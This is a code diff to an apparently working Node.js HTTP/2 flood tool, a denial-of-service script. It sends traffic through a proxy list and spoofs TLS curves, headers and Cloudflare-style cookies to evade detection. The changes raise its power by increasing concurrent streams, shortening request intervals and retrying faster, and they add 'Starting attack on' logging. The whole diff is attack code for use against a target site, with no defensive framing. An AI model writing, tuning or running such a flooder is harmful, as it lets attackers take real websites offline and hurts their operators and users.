@@ -5,6 +5,7 @@ const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
+const os = require("os"); // Added for resource monitoring
 
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
@@ -119,13 +120,27 @@ const ciphers = [
 
 const proxies = readLines(args.proxyFile);
 
+// Resource monitoring variables
+const maxCpuUsage = 0.85; // Stop sending requests if CPU usage exceeds 85%
+let requestCounter = 0; // Track successful requests
+const maxConcurrentConnections = 50; // Max connections per thread
+
 if (cluster.isMaster) {
+    console.log(`Starting attack on ${args.target} with ${args.threads} threads for ${args.time} seconds`);
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-    setTimeout(() => process.exit(0), args.time * 1000);
+    setTimeout(() => {
+        console.log(`Attack finished. Total requests sent: ${requestCounter}`);
+        process.exit(0);
+    }, args.time * 1000);
+
+    // Periodically log request rate
+    setInterval(() => {
+        console.log(`Current request rate: ${requestCounter / (args.time * 1000)} req/s`);
+    }, 5000);
 } else {
-    setInterval(runFlooder, 100);
+    setInterval(runFlooder, 50); // Reduced interval for faster cycling
 }
 
 class NetSocket {
@@ -210,14 +225,24 @@ function generateDynamicHeaders() {
         "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
         "sec-ch-viewport-width": randomIntn(800, 1920).toString()
     };
-    // Thêm cookie ngẫu nhiên để mô phỏng phiên người dùng
     if (Math.random() > 0.5) {
         headers["cookie"] = `__cfduid=${randstr(32)}; session=${randstr(16)}`;
     }
     return headers;
 }
 
+// Resource monitoring function
+function checkSystemLoad() {
+    const load = os.loadavg()[0] / os.cpus().length; // Normalized CPU load
+    return load < maxCpuUsage;
+}
+
 function runFlooder() {
+    if (!checkSystemLoad()) {
+        // console.log("System load too high, pausing requests...");
+        return setTimeout(runFlooder, 1000); // Pause if CPU is overloaded
+    }
+
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 1000);
@@ -226,13 +251,13 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 5 // Tăng timeout để xử lý proxy chậm
+        timeout: 5
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) {
             if (connection) connection.destroy();
-            return setTimeout(runFlooder, 1000);
+            return setTimeout(runFlooder, 500); // Faster retry on failure
         }
 
         const tlsOptions = {
@@ -244,7 +269,7 @@ function runFlooder() {
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
             maxVersion: 'TLSv1.3',
-            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1']) // Ngẫu nhiên hóa curve để cải thiện JA3
+            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1'])
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -254,29 +279,47 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 30, // Giảm xuống 25 để tránh bị phát hiện
+                maxConcurrentStreams: 100, // Increased for higher throughput
                 initialWindowSize: 6291456,
                 maxHeaderListSize: 65536
             },
-            createConnection: () => tlsConn
+            createConnection: () => tlsConn,
+            maxSessionMemory: 100 // Increased session memory for more streams
         });
+
+        let activeStreams = 0; // Track active streams to prevent overload
 
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
+                if (activeStreams >= maxConcurrentConnections || !checkSystemLoad()) {
+                    return; // Skip if too many streams or CPU is overloaded
+                }
+
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 12); i++) { // Giảm xuống 12 request mỗi chu kỳ
+                const maxRequests = Math.min(args.Rate, 50); // Increased to 50 for more throughput
+                for (let i = 0; i < maxRequests; i++) {
+                    if (activeStreams >= maxConcurrentConnections) break;
+
                     const request = client.request(dynHeaders);
+                    activeStreams++;
+
                     request.on("response", () => {
+                        requestCounter++; // Increment successful request counter
                         request.close();
                         request.destroy();
+                        activeStreams--;
                     });
+
                     request.on("error", () => {
                         request.close();
                         request.destroy();
+                        activeStreams--;
                     });
+
                     request.end();
                 }
-            }, 100); // Tăng lên 150ms để giảm áp lực
+            }, 50); // Reduced interval for faster requests
+
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
@@ -284,14 +327,14 @@ function runFlooder() {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
 
         client.on("close", () => {
             client.destroy();
             tlsConn.destroy();
             connection.destroy();
-            setTimeout(runFlooder, 1000);
+            setTimeout(runFlooder, 500);
         });
     });
 }
